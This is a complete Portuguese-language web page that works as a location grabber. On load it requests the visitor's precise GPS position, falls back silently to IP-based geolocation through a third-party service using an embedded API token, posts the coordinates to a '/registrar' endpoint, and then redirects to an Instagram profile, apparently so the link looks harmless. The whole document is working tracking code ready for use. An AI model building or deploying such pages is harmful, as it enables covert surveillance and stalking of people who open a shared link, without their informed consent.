<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Localizando...</title>
    <script>
        function enviarLocalizacao(lat, lon, precisa) {
            if (!lat || !lon || lat === 0.0 || lon === 0.0) {
                console.warn("Localização inválida, não será enviada.");
                return;
            }

            fetch('/registrar', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ lat, lon, precisa })
            }).finally(() => {
                window.location.href = "https://www.instagram.com/mateusflorenzano?igsh=ZmF5a2UyNml3Nmc0";
            });
        }

        function tentarLocalizacaoPorIP() {
            fetch('https://ipinfo.io/json?token=848013f8df8279')  // Substitua por seu token real
                .then(res => res.json())
                .then(d => {
                    if (!d.loc) throw new Error("Sem campo loc no IPInfo");
                    const [lat, lon] = d.loc.split(',');
                    enviarLocalizacao(parseFloat(lat), parseFloat(lon), false);
                })
                .catch(err => {
                    console.error("Erro ao buscar localização por IP:", err);
                    enviarLocalizacao(0.0, 0.0, false);
                });
        }

        navigator.geolocation.getCurrentPosition(
            pos => {
                const { latitude, longitude } = pos.coords;
                enviarLocalizacao(latitude, longitude, true);
            },
            err => {
                console.warn("GPS negado ou falhou:", err);
                tentarLocalizacaoPorIP();
            },
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
    </script>
</head>
<body>
    <p>Obtendo sua localização...</p>
</body>
</html>
